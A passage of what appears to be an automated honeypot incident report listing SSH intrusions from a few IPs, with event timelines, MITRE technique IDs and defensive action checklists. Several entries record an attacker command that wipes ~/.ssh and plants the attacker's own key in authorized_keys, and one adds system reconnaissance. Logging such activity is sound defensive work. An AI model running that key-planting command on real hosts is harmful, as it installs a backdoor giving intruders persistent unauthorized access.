| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:25:07` | `cowrie.session.connect` |
| `2026-04-26 04:25:07` | `cowrie.client.version` |
| `2026-04-26 04:25:07` | `cowrie.client.kex` |
| `2026-04-26 04:25:07` | `cowrie.login.success` |
| `2026-04-26 04:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12759bf6177a

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:26 |
| **Last Seen** | 2026-04-26 04:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:26:29` | `cowrie.session.connect` |
| `2026-04-26 04:26:29` | `cowrie.client.version` |
| `2026-04-26 04:26:29` | `cowrie.client.kex` |
| `2026-04-26 04:26:30` | `cowrie.login.success` |
| `2026-04-26 04:26:30` | `cowrie.session.params` |
| `2026-04-26 04:26:30` | `cowrie.command.input` |
| `2026-04-26 04:26:30` | `cowrie.command.failed` |
| `2026-04-26 04:26:30` | `cowrie.log.closed` |
| `2026-04-26 04:26:30` | `cowrie.session.params` |
| `2026-04-26 04:26:30` | `cowrie.command.input` |
| `2026-04-26 04:26:30` | `cowrie.session.file_download` |
| `2026-04-26 04:26:30` | `cowrie.log.closed` |
| `2026-04-26 04:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd6d7ffd5682

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:26 |
| **Last Seen** | 2026-04-26 04:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:26:32` | `cowrie.session.connect` |
| `2026-04-26 04:26:32` | `cowrie.client.version` |
| `2026-04-26 04:26:32` | `cowrie.client.kex` |
| `2026-04-26 04:26:32` | `cowrie.login.success` |
| `2026-04-26 04:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4507c26379e6

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:27 |
| **Last Seen** | 2026-04-26 04:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:27:58` | `cowrie.session.connect` |
| `2026-04-26 04:27:58` | `cowrie.client.version` |
| `2026-04-26 04:27:58` | `cowrie.client.kex` |
| `2026-04-26 04:27:58` | `cowrie.login.success` |
| `2026-04-26 04:27:58` | `cowrie.session.params` |
| `2026-04-26 04:27:58` | `cowrie.command.input` |
| `2026-04-26 04:27:58` | `cowrie.command.failed` |
| `2026-04-26 04:27:58` | `cowrie.log.closed` |
| `2026-04-26 04:27:58` | `cowrie.session.params` |
| `2026-04-26 04:27:58` | `cowrie.command.input` |
| `2026-04-26 04:27:59` | `cowrie.session.file_download` |
| `2026-04-26 04:27:59` | `cowrie.log.closed` |
| `2026-04-26 04:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f439d83f92

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:28 |
| **Last Seen** | 2026-04-26 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:28:00` | `cowrie.session.connect` |
| `2026-04-26 04:28:00` | `cowrie.client.version` |
| `2026-04-26 04:28:00` | `cowrie.client.kex` |
| `2026-04-26 04:28:01` | `cowrie.login.success` |
| `2026-04-26 04:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a45c7ab4e030

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:29 |
| **Last Seen** | 2026-04-26 04:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:29:26` | `cowrie.session.connect` |
| `2026-04-26 04:29:26` | `cowrie.client.version` |
| `2026-04-26 04:29:26` | `cowrie.client.kex` |
| `2026-04-26 04:29:26` | `cowrie.login.success` |
| `2026-04-26 04:29:27` | `cowrie.session.params` |
| `2026-04-26 04:29:27` | `cowrie.command.input` |
| `2026-04-26 04:29:27` | `cowrie.command.failed` |
| `2026-04-26 04:29:27` | `cowrie.log.closed` |
| `2026-04-26 04:29:27` | `cowrie.session.params` |
| `2026-04-26 04:29:27` | `cowrie.command.input` |
| `2026-04-26 04:29:27` | `cowrie.session.file_download` |
| `2026-04-26 04:29:27` | `cowrie.log.closed` |
| `2026-04-26 04:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf5f7bac0cb

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:29 |
| **Last Seen** | 2026-04-26 04:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:29:29` | `cowrie.session.connect` |
| `2026-04-26 04:29:29` | `cowrie.client.version` |
| `2026-04-26 04:29:29` | `cowrie.client.kex` |
| `2026-04-26 04:29:29` | `cowrie.login.success` |
| `2026-04-26 04:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2901fe8ab847

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]228` |
| **First Seen** | 2026-04-26 04:36 |
| **Last Seen** | 2026-04-26 04:37 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}', ls -lh $(which ls)` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:36:21` | `cowrie.session.connect` |
| `2026-04-26 04:36:21` | `cowrie.client.version` |
| `2026-04-26 04:36:21` | `cowrie.client.kex` |
| `2026-04-26 04:36:28` | `cowrie.login.success` |
| `2026-04-26 04:36:29` | `cowrie.session.params` |
| `2026-04-26 04:36:29` | `cowrie.command.input` |
| `2026-04-26 04:36:29` | `cowrie.command.failed` |
| `2026-04-26 04:36:29` | `cowrie.log.closed` |
| `2026-04-26 04:36:31` | `cowrie.session.params` |
| `2026-04-26 04:36:31` | `cowrie.command.input` |
| `2026-04-26 04:36:32` | `cowrie.session.file_download` |
| `2026-04-26 04:36:32` | `cowrie.log.closed` |
| `2026-04-26 04:36:44` | `cowrie.session.params` |
| `2026-04-26 04:36:44` | `cowrie.command.input` |
| `2026-04-26 04:36:44` | `cowrie.log.closed` |
| `2026-04-26 04:37:02` | `cowrie.session.params` |
| `2026-04-26 04:37:02` | `cowrie.command.input` |
| `2026-04-26 04:37:02` | `cowrie.log.closed` |
| `2026-04-26 04:37:03` | `cowrie.session.params` |
| `2026-04-26 04:37:03` | `cowrie.command.input` |
| `2026-04-26 04:37:03` | `cowrie.command.input` |
| `2026-04-26 04:37:03` | `cowrie.log.closed` |
| `2026-04-26 04:37:03` | `cowrie.session.params` |
| `2026-04-26 04:37:03` | `cowrie.command.input` |
| `2026-04-26 04:37:03` | `cowrie.log.closed` |
| `2026-04-26 04:37:03` | `cowrie.session.params` |
| `2026-04-26 04:37:03` | `cowrie.command.input` |
| `2026-04-26 04:37:03` | `cowrie.log.closed` |
| `2026-04-26 04:37:03` | `cowrie.session.params` |
| `2026-04-26 04:37:03` | `cowrie.command.input` |
| `2026-04-26 04:37:03` | `cowrie.log.closed` |
| `2026-04-26 04:37:04` | `cowrie.session.params` |
| `2026-04-26 04:37:04` | `cowrie.command.input` |
| `2026-04-26 04:37:04` | `cowrie.log.closed` |
| `2026-04-26 04:37:04` | `cowrie.session.params` |
| `2026-04-26 04:37:04` | `cowrie.command.input` |
| `2026-04-26 04:37:04` | `cowrie.log.closed` |
| `2026-04-26 04:37:04` | `cowrie.session.params` |
| `2026-04-26 04:37:04` | `cowrie.command.input` |
| `2026-04-26 04:37:04` | `cowrie.log.closed` |
| `2026-04-26 04:37:04` | `cowrie.session.params` |
| `2026-04-26 04:37:04` | `cowrie.command.input` |
| `2026-04-26 04:37:04` | `cowrie.log.closed` |
| `2026-04-26 04:37:05` | `cowrie.session.params` |
| `2026-04-26 04:37:05` | `cowrie.command.input` |
| `2026-04-26 04:37:05` | `cowrie.log.closed` |
| `2026-04-26 04:37:05` | `cowrie.session.params` |
| `2026-04-26 04:37:05` | `cowrie.command.input` |
| `2026-04-26 04:37:05` | `cowrie.log.closed` |
| `2026-04-26 04:37:05` | `cowrie.session.params` |
| `2026-04-26 04:37:05` | `cowrie.command.input` |
| `2026-04-26 04:37:05` | `cowrie.log.closed` |
| `2026-04-26 04:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6981c38cd098

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]228` |
| **First Seen** | 2026-04-26 04:37 |
| **Last Seen** | 2026-04-26 04:38 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:37:52` | `cowrie.session.connect` |
| `2026-04-26 04:37:52` | `cowrie.client.version` |
| `2026-04-26 04:37:52` | `cowrie.client.kex` |
| `2026-04-26 04:37:57` | `cowrie.login.success` |
| `2026-04-26 04:38:00` | `cowrie.session.params` |
| `2026-04-26 04:38:00` | `cowrie.command.input` |
| `2026-04-26 04:38:00` | `cowrie.command.failed` |
| `2026-04-26 04:38:15` | `cowrie.log.closed` |
| `2026-04-26 04:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cc33a1dde07

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]228` |
| **First Seen** | 2026-04-26 04:38 |
| **Last Seen** | 2026-04-26 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:38:12` | `cowrie.session.connect` |
| `2026-04-26 04:38:12` | `cowrie.client.version` |
| `2026-04-26 04:38:12` | `cowrie.client.kex` |
| `2026-04-26 04:38:13` | `cowrie.login.success` |
| `2026-04-26 04:38:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14e16be3ced8

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:39 |
| **Last Seen** | 2026-04-26 04:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:39:34` | `cowrie.session.connect` |
| `2026-04-26 04:39:34` | `cowrie.client.version` |
| `2026-04-26 04:39:34` | `cowrie.client.kex` |
| `2026-04-26 04:39:34` | `cowrie.login.success` |
| `2026-04-26 04:39:34` | `cowrie.session.params` |
| `2026-04-26 04:39:34` | `cowrie.command.input` |
| `2026-04-26 04:39:34` | `cowrie.command.failed` |
| `2026-04-26 04:39:34` | `cowrie.log.closed` |
| `2026-04-26 04:39:35` | `cowrie.session.params` |
| `2026-04-26 04:39:35` | `cowrie.command.input` |
| `2026-04-26 04:39:35` | `cowrie.session.file_download` |
| `2026-04-26 04:39:35` | `cowrie.log.closed` |
| `2026-04-26 04:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc3e4972a03c

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:39 |
| **Last Seen** | 2026-04-26 04:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:39:37` | `cowrie.session.connect` |
| `2026-04-26 04:39:37` | `cowrie.client.version` |
| `2026-04-26 04:39:37` | `cowrie.client.kex` |
| `2026-04-26 04:39:37` | `cowrie.login.success` |
| `2026-04-26 04:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b942aa13f1cc

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:42 |
| **Last Seen** | 2026-04-26 04:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:42:38` | `cowrie.session.connect` |
| `2026-04-26 04:42:38` | `cowrie.client.version` |
| `2026-04-26 04:42:38` | `cowrie.client.kex` |
| `2026-04-26 04:42:38` | `cowrie.login.success` |
| `2026-04-26 04:42:38` | `cowrie.session.params` |
| `2026-04-26 04:42:38` | `cowrie.command.input` |
| `2026-04-26 04:42:38` | `cowrie.command.failed` |
| `2026-04-26 04:42:39` | `cowrie.log.closed` |
| `2026-04-26 04:42:39` | `cowrie.session.params` |
| `2026-04-26 04:42:39` | `cowrie.command.input` |
| `2026-04-26 04:42:39` | `cowrie.session.file_download` |
| `2026-04-26 04:42:39` | `cowrie.log.closed` |
| `2026-04-26 04:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9811118ea7b3

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:42 |
| **Last Seen** | 2026-04-26 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:42:41` | `cowrie.session.connect` |
| `2026-04-26 04:42:41` | `cowrie.client.version` |
| `2026-04-26 04:42:41` | `cowrie.client.kex` |
| `2026-04-26 04:42:41` | `cowrie.login.success` |
| `2026-04-26 04:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b28645abf5

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:42 |
| **Last Seen** | 2026-04-26 04:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:42:57` | `cowrie.session.connect` |
| `2026-04-26 04:42:57` | `cowrie.client.version` |
| `2026-04-26 04:42:57` | `cowrie.client.kex` |
| `2026-04-26 04:42:57` | `cowrie.login.success` |
| `2026-04-26 04:42:58` | `cowrie.session.params` |
| `2026-04-26 04:42:58` | `cowrie.command.input` |
| `2026-04-26 04:42:58` | `cowrie.command.failed` |
| `2026-04-26 04:42:58` | `cowrie.log.closed` |
| `2026-04-26 04:42:58` | `cowrie.session.params` |
| `2026-04-26 04:42:58` | `cowrie.command.input` |
| `2026-04-26 04:42:58` | `cowrie.session.file_download` |
| `2026-04-26 04:42:58` | `cowrie.log.closed` |
| `2026-04-26 04:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-316f3055d92c

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 04:43 |
| **Last Seen** | 2026-04-26 04:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:43:00` | `cowrie.session.connect` |
| `2026-04-26 04:43:00` | `cowrie.client.version` |
| `2026-04-26 04:43:00` | `cowrie.client.kex` |
| `2026-04-26 04:43:00` | `cowrie.login.success` |
| `2026-04-26 04:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3040e624d1e9

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:44 |
| **Last Seen** | 2026-04-26 04:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
